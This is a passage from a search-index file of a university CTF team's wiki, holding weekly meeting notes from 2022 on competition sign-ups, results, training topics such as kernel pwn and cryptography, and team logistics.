university: August 26th.</li> <li>For companies: August 31st.</li> </ul> <p>This event is one of the most famous CTF competitions. The size for each team is 4 members, we are going to have 2 or 3 teams.</p> <p>This event would be easier than the Qiangwang cup. However, it's not easy to get into the final round.</p> <p>If you are interested in this event, please send me the register information.</p> Name Team \u5218\u4e50\u5947 1"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-11/#other-competitions","title":"Other competitions","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-11/#2022","title":"2022\u201c\u5dc5\u5cf0\u6781\u5ba2\u201d\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u6311\u6218\u8d5b","text":"<p>http://www.peakgeek.cn/#/</p> <p>\u7ebf\u4e0a\u8d5b\u62a5\u540d\uff1a2022-08-01 10:00:00 - 2022-08-15 12:00:00</p> <p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2022-08-17 10:00:00 - 2022-08-17 19:00:00</p> <p>\u53c2\u8d5b\u8005\u987b\u4ee5\u56e2\u961f\u4e3a\u5355\u4f4d\u62a5\u540d\u53c2\u8d5b\uff0c\u6bcf\u652f\u961f\u4f0d\u8bbe\u961f\u957f1\u540d\uff08\u5fc5\u987b\uff09\uff0c\u961f\u957f\u5fc5\u987b\u662f\u53c2\u8d5b\u961f\u5458\uff0c\u8d1f\u8d23\u53c2\u8d5b\u961f\u4f0d\u7684\u7ec4\u7ec7\u7ba1\u7406\u3002\u6bcf\u652f\u961f\u4f0d\u53c2\u8d5b\u961f\u5458\u4e0d\u8d85\u8fc74\u4eba\uff08\u542b\u961f\u957f\uff09\u3002\u53c2\u8d5b\u961f\u5458\u53ea\u80fd\u96b6\u5c5e\u4e8e\u4e00\u652f\u961f\u4f0d\uff0c\u6bd4\u8d5b\u664b\u7ea7\u8fc7\u7a0b\u4e2d\u5982\u679c\u6709\u961f\u5458\u4e2d\u9014\u9000\u51fa\uff0c\u4e0d\u80fd\u8865\u4f4d\u3002\u961f\u957f\u9000\u51fa\u53ef\u7531\u961f\u5185\u5176\u4ed6\u961f\u5458\u62c5\u4efb\u3002\u5efa\u8bae\u7531\u961f\u957f\u7edf\u4e00\u8fdb\u884c\u5728\u7ebf\u62a5\u540d\uff0c\u62a5\u540d\u5b8c\u6210\u540e\u53ef\u901a\u8fc7\u4e13\u9898\u9875\u7684\u62a5\u540d\u67e5\u8be2\u529f\u80fd\u67e5\u770b\u662f\u5426\u5df2\u62a5\u540d\u6210\u529f\u3002</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-11/#_1","title":"\u7b2c\u4e8c\u5c4a\u201c\u957f\u57ce\u676f\u201d\u7f51\u7edc\u5b89\u5168\u5927\u8d5b","text":"<p>https://bm.ichunqiu.com/2022ccb</p> <p>\u7ebf\u4e0a\u8d5b\u62a5\u540d\uff1a2022-07-25 10:00:00 - 2022-08-12 12:00:00</p> <p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2022-08-23 12:00:00 - 2022-08-23 18:00:00</p> <p>4\u3001\u53c2\u8d5b\u8005\u987b\u4ee5\u56e2\u961f\u4e3a\u5355\u4f4d\u62a5\u540d\u53c2\u8d5b\uff0c\u6bcf\u961f\u4eba\u6570\u4e0d\u8d85\u8fc73\u4eba\uff0c\u987b\u8bbe\u961f\u957f1\u540d\uff1b\u961f\u957f\u53ef\u4ee5\u67e5\u770b\u548c\u7f16\u8f91\u672c\u961f\u961f\u5458\u7684\u4fe1\u606f\uff0c\u5e76\u7ba1\u7406\u672c\u961f\u961f\u5458\u7684\u52a0\u5165\u4e0e\u9000\u51fa\u3002</p> <p>5\u3001\u6bcf\u652f\u961f\u4f0d\u53ef\u53e6\u8bbe\u9886\u961f1\u540d\uff0c\u9886\u961f\u4e0d\u5f97\u53c2\u8d5b\u3002</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-11/#notes","title":"Notes","text":"<ul> <li>[ ] Ready for the GD CTF 2nd Final script.</li> <li>[x] Move all the challenges to the Detroit server.</li> <li>[x] Update the QWB award information.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/","title":"CTF Week Meeting 2022-09-08","text":"<ol> <li>Training schedule for this weekend.</li> <li>Detroit CTFd update.</li> <li>Sign up for events.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/#training-schedule-for-this-weekend","title":"Training schedule for this weekend","text":"<p>Currently, the university is still under the COVID situation, I'm not able to return to the university.</p> <p>This weekend's meeting &amp; welcome schedule would be canceled.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/#detroit-ctfd-update","title":"Detroit CTFd update","text":"<p>Thanks to the @Frankss, the mistakes on the Detroit CTFd server are repaired.</p> <ul> <li>500 Internal error during logging in with the previous account.</li> <li>Score graph display error.</li> </ul> <p>Those problems occur as a result of the dirty transfer of the data through different CTFd versions.</p> <p>If you want to use your old account, please contact me to reset the password.</p> <p>Besides, I'm trying to use GZCTF for further challenges maintenance. CTFd and GZCTF are using different hash functions for password hashing. As a result, all the passwords would be protected by a random value.</p> <p>After the transfer to GZCTF, I would reset the password.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/#sign-up-for-events","title":"Sign up for events","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/#_1","title":"\u7b2c\u4e94\u5c4a\u7f8e\u56e2\u7f51\u7edc\u5b89\u5168\u9ad8\u6821\u6311\u6218\u8d5b\uff08\u521d\u8d5b\uff09","text":"<p>\u5b98\u65b9\u6bd4\u8d5b\u94fe\u63a5\u5730\u5740\uff1ahttps://bm.ichunqiu.com/2022meituan</p> <p>\u7ebf\u4e0a\u8d5b\u62a5\u540d\uff1a2022-09-01 10:00:00 - 2022-09-16 10:00:00</p> <p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2022-09-17 09:00:00 - 2022-09-17 21:00:00</p> <p>\u672c\u6b21\u6bd4\u8d5b\u4e3b\u529e\u65b9\uff1a\u7f8e\u56e2\u5b89\u5168\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\uff1b\u7f8e\u56e2\u00b7\u6821\u56ed\u62db\u8058</p> <p>\u6280\u672f\u652f\u6301\uff1a\u6c38\u4fe1\u81f3\u8bda</p> <p>\u521d\u8d5b\uff1a\u521d\u8d5b\u91c7\u7528\u7ebf\u4e0aCTF\u56e2\u961f\u8d5b\u7684\u5f62\u5f0f\uff0c\u6bd4\u8d5b\u65f6\u957f12\u5c0f\u65f6\u3002</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/#2022","title":"2022\u5e74\u4e2d\u56fd\u5de5\u4e1a\u4e92\u8054\u7f51\u5b89\u5168\u5927\u8d5b\u5317\u4eac\u5e02\u9009\u62d4\u8d5b\u66a8\u5168\u56fd\u7ebf\u4e0a\u9884\u9009\u8d5b","text":"<p>https://www.chinaiisc.cn/beijing</p> <p>1) \u7ade\u8d5b\u4e3a\u4e09\u4eba\u56e2\u4f53\u8d5b\uff0c\u62a5\u540d\u53c2\u8d5b\u7684\u89d2\u8272\u5206\u522b\u4e3a\u9009\u624b1\uff08\u961f\u957f\uff09\u3001\u9009\u624b2\u3001\u9009\u624b3\u3002</p> <p>2) \u62a5\u540d\u8d77\u6b62\u65f6\u95f4\uff1a8\u670824\u65e5 00:00 \u2014 9\u670816\u65e5 24:00</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/#_2","title":"\u5b57\u8282\u8df3\u52a8\u201c\u5b89\u5168\u8303\u513f\u201d\u9ad8\u6821\u6311\u6218\u8d5b","text":"<p>https://ctf.bytedance.com/</p> <p>\u62a5\u540d\u65f6\u95f4\uff1a8\u67088\u65e5 - 9\u670822\u65e5</p> <p>\u6bd4\u8d5b\u65f6\u95f4\uff1a9\u670824\u65e5 - 9\u670825\u65e5</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/#notes","title":"Notes","text":"<ul> <li>[ ] Ready for the GD CTF 2nd Final script.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/","title":"CTF Week Meeting 2022-09-15","text":"<ol> <li> <p>Challenge update.</p> </li> <li> <p>Offline meeting &amp; inviting for 2022 students.</p> </li> <li> <p>Event sign-up.</p> </li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/#challenge-update","title":"Challenge update","text":"<p>We are going to format the challenges platform to hold and collection of event challenges.</p> <p>These kinds of challenges would be stored:</p> <ol> <li> <p>Event challenges that are already unable to submit on the event's website.</p> </li> <li> <p>Original challenges.</p> </li> <li> <p>Qualification exam.</p> </li> </ol> <p>Other challenges would be removed.</p> <p>Besides, I would post writeups for all challenges these days.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/#offline-meeting-invitation-for-2022-students","title":"Offline meeting &amp; invitation for 2022 students","text":"<p>I'm planning for a sharing and meeting with 2022 students who are interested in the CTF &amp; Infosec.</p> <p>The sharing time would be on the 1st, of Oct, or the 2nd, of Oct. The sharing would be given by team members.</p> <p>According to the schedule this semester, the whole of October would be used for new students' training.</p> <p>Before the October, we would have 1 advanced training for team members.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/#sign-up-for-events","title":"Sign up for events","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/#-1-team","title":"\u7b2c\u4e94\u5c4a\u7f8e\u56e2\u7f51\u7edc\u5b89\u5168\u9ad8\u6821\u6311\u6218\u8d5b\uff08\u521d\u8d5b\uff09 - 1 team","text":"<p>\u5b98\u65b9\u6bd4\u8d5b\u94fe\u63a5\u5730\u5740\uff1ahttps://bm.ichunqiu.com/2022meituan</p> <p>\u7ebf\u4e0a\u8d5b\u62a5\u540d\uff1a2022-09-01 10:00:00 - 2022-09-16 10:00:00</p> <p>\u7ebf\u4e0a\u8d5b\u65f6\u95f4\uff1a2022-09-17 09:00:00 - 2022-09-17 21:00:00</p> <p>\u672c\u6b21\u6bd4\u8d5b\u4e3b\u529e\u65b9\uff1a\u7f8e\u56e2\u5b89\u5168\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\uff1b\u7f8e\u56e2\u00b7\u6821\u56ed\u62db\u8058</p> <p>\u6280\u672f\u652f\u6301\uff1a\u6c38\u4fe1\u81f3\u8bda</p> <p>\u521d\u8d5b\uff1a\u521d\u8d5b\u91c7\u7528\u7ebf\u4e0aCTF\u56e2\u961f\u8d5b\u7684\u5f62\u5f0f\uff0c\u6bd4\u8d5b\u65f6\u957f12\u5c0f\u65f6\u3002</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/#2022-1-team","title":"2022\u5e74\u4e2d\u56fd\u5de5\u4e1a\u4e92\u8054\u7f51\u5b89\u5168\u5927\u8d5b\u5317\u4eac\u5e02\u9009\u62d4\u8d5b\u66a8\u5168\u56fd\u7ebf\u4e0a\u9884\u9009\u8d5b - 1 team","text":"<p>https://www.chinaiisc.cn/beijing</p> <p>1) \u7ade\u8d5b\u4e3a\u4e09\u4eba\u56e2\u4f53\u8d5b\uff0c\u62a5\u540d\u53c2\u8d5b\u7684\u89d2\u8272\u5206\u522b\u4e3a\u9009\u624b1\uff08\u961f\u957f\uff09\u3001\u9009\u624b2\u3001\u9009\u624b3\u3002</p> <p>2) \u62a5\u540d\u8d77\u6b62\u65f6\u95f4\uff1a8\u670824\u65e5 00:00 \u2014 9\u670816\u65e5 24:00</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/#-1-team-not-full","title":"\u5b57\u8282\u8df3\u52a8\u201c\u5b89\u5168\u8303\u513f\u201d\u9ad8\u6821\u6311\u6218\u8d5b - 1 team (not full)","text":"<p>https://ctf.bytedance.com/</p> <p>\u62a5\u540d\u65f6\u95f4\uff1a8\u67088\u65e5 - 9\u670822\u65e5</p> <p>\u6bd4\u8d5b\u65f6\u95f4\uff1a9\u670824\u65e5 - 9\u670825\u65e5</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/#notes","title":"Notes","text":"<p>[ ] Ready for the GD CTF 2nd Final script.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-22/","title":"CTF Week Meeting 2022-09-22","text":"<ol> <li> <p>Good news.</p> </li> <li> <p>Double good news.</p> </li> <li> <p>ByteCTF register.</p> </li> <li> <p>Offline party time.</p> </li> <li> <p>Training schedule for this week.</p> </li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-22/#good-news","title":"Good news","text":"<p>We got rank 10 in the dfjk CTF final round.</p> <p>For this score, congratulations to @Frankss, @Monad, @GGA, and me. We won \uffe510,000 in this game, and a certification &amp; trophy for our score.</p> Rank Team 1 Straw Hat 2 Redbud 3 D1no 4 \u6781\u5ba2\u4fe1\u5b89 5 \u4f11\u95f2\u519c\u5e84 6 \u4f60\u5e72\u561b\u00b7\u00b7\u00b7\u54c8\u54c8\u00b7\u00b7\u00b7\u54ce\u54df\u00b7\u00b7\u00b7 7 \u5c0f\u6050\u9f99\u6478\u5927\u9c7c 8 \u4ed4\u9e21\u7c73\u7c89\u4e0d\u8981\u9999\u83dc 9 Nebula 10 HED 11 0x401"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-22/#double-good-news","title":"Double good news","text":"<p>In the past wd CTF, we have achieved rank 7 as well.</p> <p>Post from WD CTF official</p> <p>This is the most famous event which is hosted by Ministry of Public Security. If we won in the semifinal round, we can get the award from them.</p> Rank Team 1 Redbud 2 0ops 3 0x401 4 Asuri 5 \u5317\u95e8\u8fa3\u5b50\u9e21 6 irusA 7 HED 8 Xp0int 9 \u6765\u81ea\u4e1c\u65b9\u7684\u795e\u79d8\u529b\u91cf 10 H4F <p>Congratulation to @Frankss, @Monad, @GGA. The semifinal round is around 20 days later, offline.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-22/#bytectf-register","title":"ByteCTF register","text":"<p>The register due today!!!</p> <p>https://ctf.bytedance.com/</p> <p>We need to register on this website, and receive the team invitation.</p> <p>Now we have 2 teams, all full.</p> <p>If you are not in either of them, please create a new team, and post the team invitation code in our group.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-22/#offline-party-time","title":"Offline party time","text":"<p>Welcome everyone!</p> <p>Our party has been delayed several times, let's find a time to take a break in Hai Di Lao.</p> <p>Would it's fine this weekend?</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-22/#training-schedule-for-this-week","title":"Training schedule for this week","text":"<p>Our schedule is set to ByteCTF on this Sunday.</p> <p>But I also wrote some tutorials about the kernel pwn for you. It's a pleasure to share something about pwning.</p> <p>In the CTF, pwn is the most challenging part of all aspects. Usually, we divide pwn into 3 parts: stack, heap, and kernel.</p> <p>We already learned about the stack pwn (bof, rop, and rol). However, about the heap and the kernel, we still need to deal with them.</p> <p>In the kernel pwn, I would introduce several parts:</p> <ul> <li>Environment setup (qemu).</li> <li>Kernel driver design and debug.</li> <li>Common steps to solve a kernel pwn.</li> <li>Practice with kernel UAF.</li> </ul> <p>After learning about this part, we can try to find some Linux kernel vulnerabilities, just like CVE-2021-3156 or CVE-2021-4034.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-30/","title":"CTF Week Meeting 2022-09-30","text":"<ol> <li>WD Cup semi-final.</li> <li>Advertise plan.</li> <li>About CS315.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-30/#wd-cup-semi-final","title":"WD Cup semi-final","text":"<p>The current planning for the WD Cup semi-final is around November.</p> <p>Please submit your information before 10th, Oct.</p> <pre><code>\u795d\u8d3a\u6240\u6709\u664b\u7ea7\u961f\u4f0d\uff01\u8bf7\u6240\u6709\u664b\u7ea7\u534a\u51b3\u8d5b\u7684\u9009\u624b\u4e8e10\u670810\u65e5\u524d\u4f7f\u7528\u62a5\u540d\u8d26\u53f7\u767b\u5f55\u7f51\u9f0e\u676f\u5b98\u7f51\uff08https://www.wangdingcup.com\uff09\uff0c\u5e76\u6309\u9875\u9762\u63d0\u793a\u4e0a\u4f20\u672c\u4eba\u8bc1\u4ef6\u7167\u7247\uff0c\u7167\u7247\u5c06\u7528\u4e8e\u7ebf\u4e0b\u8d5b\u53c2\u8d5b\u8bc1\u7684\u5236\u4f5c\u3002\n</code></pre> <pre><code>Congratulations to all the advancing teams! Please visit the official website of Netding Cup (https://www.wangdingcup.com) with your registration account before October 10 and follow the instructions on the page to upload your ID photo, which will be used for the production of your offline competition entry card.\n</code></pre>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-30/#advertise-plan","title":"Advertise plan","text":"<p>COMPASS CTF team has several works about the advertisement:</p> <ul> <li>Wiki page: https://wiki.compass.college/</li> <li>Translation and Baidu SEO.</li> <li>Challenge platform: http://116.7.234.225/</li> <li>Going to use HTTPS.</li> <li>Challenge selection and dynamic docker transmission.</li> <li>Multi-platform support, blogs, and posts.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-30/#about-cs315","title":"About CS315","text":"<p>CS315 Computer security course is the most interesting course in SUSTech. I really want to do some cool stuff in CS315.</p> <p>Discussion about the CS315.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-30/#upcoming-events","title":"Upcoming events","text":"<p>The Third \"Xiang Yun Cup\" Network Security Competition and the Fifth Jilin Province Student Network Security Competition (preliminary round)</p> <p>https://www.ichunqiu.com/competition/detail/293</p> <p>The organizer of the competition: Office of Network Security and Informatization Committee of the CPC Jilin Provincial Committee, Jilin Provincial Department of Education, Jilin Provincial Administration of Government Services and Digital Construction Organizer: Jilin Jilin Xiangyun Information Technology Co. Co-organizer: Beijing Yongxin Zhicheng Technology Co.</p> <ul> <li>Online tournament registration: 2022-09-30 10:00:00 - 2022-10-27 10:00:00</li> <li>Online tournament time: 2022-10-29 09:00:00 - 2022-10-30 21:00:00</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/","title":"CTF Week Meeting 2022-10-06","text":"<ol> <li>Offline activities.</li> <li>CS315 related discussion.</li> <li>Training schedule and our next plans.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#offline-activities","title":"Offline activities","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#dinner-party","title":"Dinner party","text":"<p>Not sure about the exeat recent days.</p> <p>If the time arrangement is fine, let's have our offline activity soon.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#honor-certificates","title":"Honor certificates","text":"<p>If you remember about the qwb, our honor certificates are delivered to the university. We have amazing ranks in this game, and congratulations to all participators.</p> <p>We can take a photo together in offline party.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#usb-drive","title":"USB drive","text":"<p>I've updated a vmware pro distribution in the usb drive.</p> <ul> <li>VMware pro 16.</li> <li>Win 10 hacking iso.</li> <li>Kali linux.</li> <li>Black arch.</li> </ul> <p>If you have other suggestions, please contact me.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#cs315","title":"CS315","text":"<p>We have received some suggestions about CS315 recently. The main discussion about the CS315 is listed below:</p> <ul> <li>In the lab lesson, it's hard to meet TAs and ask questions.</li> <li>Lab virtual machines are too large, downloading them costs lots of time.</li> <li>We should update lab vm to recent vulnerabilities.</li> </ul> <p>Prof. Zhang takes lots of effects to make CS315 interesting and worthy. I'm also want to have a valuable chance to introduce CTF. We are updating and improving CS315 these days.</p> <p>If you have any suggestions, please contact us.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#training-schedule","title":"Training schedule","text":"<p>The past 2 weeks are busy and chaotic. I have some family affairs to deal, and got stomach flu these days. Sorry about my absence in the training.</p> <p>We would back to normal after the holiday.</p> <p>Looking forward to sharing and learning with you!</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#upcoming-events","title":"Upcoming events","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#xiangyun-cup-3rd","title":"XiangYun Cup 3rd","text":"<p>https://xiangyuncup.ichunqiu.com/</p> <p>Sign up: 2022-09-30 10:00:00 - 2022-10-27 10:00:00</p> <p>Sign in: 2022-10-29 09:00:00 - 2022-10-30 21:00:00 (Online)</p> <p>Information about recent years' XiangYun Cup:</p> <pre><code>1. Anti-cheating is nothing, no team got banned.\n2. Misc is trash-bin.\n</code></pre>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#ctfshow-noob-cup","title":"CTFshow noob cup","text":"<p>https://ctf.show/challenges</p> <p>The event is over now. But the challenges are great, and we still can submit flag.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/#cybersecurityrumble-ctf","title":"CyberSecurityRumble CTF","text":"<p>https://cybersecurityrumble.de/</p> <p>Online: 2022-10-09 01:00:00 - 2022-10-10 01:00:00</p> <p>The (Cyber) CyberSecurityRumble Germany is back!</p> <p>The CSR this year will be a 24h online Jeopardy style CTF. Max Team size is 6 Hackers! Everybody is allowed to participate online.</p> <p>Again we'll have tasks in all categories: pwn, rev, crypto, web, ... from beginner friendly to 31337!</p> <p>Next year we'll hopefully have an onsite final again!</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-13/","title":"CTF Week Meeting 2022-10-13","text":"<ol> <li>Hackergame 2022.</li> <li>Weekly training and sharing plans.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-13/#hackergame-2022","title":"Hackergame 2022","text":"<p>https://hack.lug.ustc.edu.cn/</p> <p>USTC Hackergame 2022 Official QQ group: 849778309</p> <p>The 9th Annual University of Science and Technology of China Information Security Competition 2022 is about to open. This competition is held online and lasts up to a week, with a gradient of difficulty in the questions. In the main atmosphere of exploring and solving puzzles, contestants will compete with various levels.</p> <p>The competition will improve the quality of the questions while also having a step-by-step guide for newcomers, which will hopefully bring a good competition experience to each contestant. We welcome your active participation and wish you satisfactory results!</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-13/#weekly-training-and-sharing-plans","title":"Weekly training and sharing plans","text":"<p>According to the previous schedule, the training plan for this weekend is <code>reverse engineering</code>.</p> <p>Special thanks to the @Frankss for the sharing of <code>GDB and Dynamic Reverse</code>.</p> <p>Reference for this weekend: </p> <ul> <li>Practical Binary Analysis</li> <li>https://0xinfection.github.io/reversing/</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-13/#asis-ctf-quals-2022","title":"ASIS CTF Quals 2022","text":"<p>https://asisctf.com/</p> <p>The competition starts tomorrow.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-13/#rules","title":"Rules","text":"<p>Each team is only allowed to participate under one name.</p> <p>There is no restriction on the number of team members.</p> <p>If you have questions about tasks, ask moderators in Discord chat or email. No points will be deducted for these questions.</p> <p>If this is the first time you play over, you should know that a flag is a sentence or code that you should find in each level. There is no exact procedure to find them, you have to do several tests and think out of the box to get them. Eventually, you'll understand the dynamics of the CTF and how to quickly solve challenges.</p> <p>If you are sure your flag is true (we mean %100 SURE), but our system does not accept it, inform us via chat.</p> <p>Reporting bugs in the contest infrastructure has a reward.</p> <p>Thou shalt not be a jerk. We are all here to learn something new.</p> <p>Any attempt to disrupting the contest will result in disqualification.</p> <p>We have a dynamic scoreboard. That means the more teams solve a challenge, the less point each team gets. The formula is:</p> <p>All flags must be in this form: ASIS{[0-9a-zA-Z_-]+.!?|}, unless the contrary is stated. Flag example: <code>ASIS{_some_l33t_string_l1k3_7hi5_}</code></p> <p>There would be at least 16 tasks.</p> <p>You can find the latest news and announcements about this contest on the announcements page.</p> <p>Registration will be open until the end of the game.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-27/","title":"CTF Week Meeting 2022-10-27","text":"<ol> <li>Xiang Yun Cup Register Finish.</li> <li>Weekly Training and Sharing Plan.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-27/#xiang-yun-cup-register-finish","title":"Xiang Yun Cup Register Finish","text":"<p>https://www.ichunqiu.com/competition/detail/293</p> <p>https://xiangyuncup.ichunqiu.com/</p> <p>There is 1 team:</p> No Name 1 \u90ac\u4e00\u5e06 2 \u674e\u7167 3 \u6731\u5f18 4 \u4e25\u6587\u8c26 5 \u6731\u5609\u6960"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-27/#weekly-training-and-sharing-plan","title":"Weekly Training and Sharing Plan","text":"<p>Topic: PWN, stack, heap, and kernel.</p> <p>Contents of this weekend:</p> <ul> <li>Static analysis: basic and module.</li> <li>Leak libc base.</li> <li>Get RIP.</li> <li>Bypass kernel heap protection.</li> <li>PWN.</li> </ul> <p>The sharing topic would be: how to design a CTF challenge.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-27/#upcoming-events","title":"Upcoming Events","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-27/#hacklu-ctf-2022","title":"Hack.lu CTF 2022","text":"<p>https://ctftime.org/event/1727</p> <p>Friday, 28 October 2022, 16:00 UTC \u2014 Sunday, 30 October 2022, 16:00 UTC</p> <p>Hack.lu CTF 2022 is organized as usual by FluxFingers, the CTF team of Ruhr-University Bochum (Germany). This will be the 13th Hack.lu CTF held by us.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-27/#fe-ctf-2022-cyber-demon","title":"FE-CTF 2022: Cyber Demon","text":"<p>https://ctftime.org/event/1776</p> <p>Friday, 28 October 2022, 11:37 UTC \u2014 Sunday, 30 October 2022, 12:37 UTC</p> <p>Welcome to Cyber Demon, hacker. Now kill PulseAudio and start pwning, there\u2019s no time to waste! We\u2019re talking total undefined behavior against the forces of GNU with the only thing standing between a shell and a segfault is you \u2013 one angry hacker with an editor and a bad attitude.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-27/#bluehens-ctf-2022","title":"BlueHens CTF 2022","text":"<p>https://ctftime.org/event/1738</p> <p>Friday, 28 October 2022, 19:00 UTC \u2014 Sunday, 30 October 2022, 19:00 UTC</p> <p>A jeopardy-style CTF organized by the University of Delaware's own CTF team, that covers topics from crypto and pwn to rev and web. High-school, undergraduate, graduate, mixed, and professional teams with up to four members are allowed to compete in separate buckets. This competition is supported by the Electrical and Computer Engineering Department, Center for Cybersecurity, Assurance and Privacy, Trustworthy Computing Group, Cloud Crypto VIP Team, and Cyber Scholars at the University of Delaware. We extend our gratitude to our sponsors listed at the event URL. Registration opens September 2nd.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-11/","title":"CTF Week Meeting 2022-11-11","text":"<ol> <li>Weekly training for this weekend.</li> <li>Cyber Security Tournament on Dec 3rd - Dec 4th.</li> <li>Upcoming events.</li> </ol>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-11/#weekly-training-for-this-weekend","title":"Weekly training for this weekend","text":"<p>Topic: Modern cryptography, ECC, RC4, and AES.</p> <p>Please please please if you want to share some topics, contact me. I've shared by myself for 3 weeks!</p> <p></p> <p>We will cover the modern part of Cryptography including public key encryption, modern symmetric cryptography, and some mathematics knowledge about the cryptography.</p> <p>If you are interested in the zero-knowledge proof, today we have a lecture about that at 4:00 pm in the 551 meeting room.</p>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-11/#cyber-security-tournament-on-dec-3rd-dec-4th","title":"Cyber Security Tournament on Dec 3rd - Dec 4th","text":"<p>The idea is a brief now, if you have any challenges want to put in this game, please contact me.</p> <p>The game includes 2 parts:</p> <ul> <li>Jeopardy about interesting challenges (easy and fun) during 48 hours online.</li> <li>Attack-with-Defense in an interesting environment, an online game server, for 4 hours.</li> </ul> <p>The prize would include an SSD drive with a penetration environment on it.</p> <p>The game will invite beginners in cybersecurity and everyone who want to have a relaxed weekend. We have 2 goals:</p> <ul> <li>Provide some interesting events for students, and find our new member.</li> <li>Invite talented students to join COMPASS.</li> </ul>"},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-11/#upcoming-events","title":"Upcoming events","text":""},{"location":"Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-11/#seccon-ctf-2022-quals","title":"SECCON CTF 2022 Quals","text":"<p>Sat, 12 Nov 2022, 13:00 CST \u2014 Sun, 13 Nov 2022, 13:00 CST</p> <p>https://platform.id.seccon.jp/</p> <p>This year, we will hold an online qualification round and on-site finals.</p> <p>The finals will be in Tokyo From Feb. 11 to Feb. 12 and have international and domestic 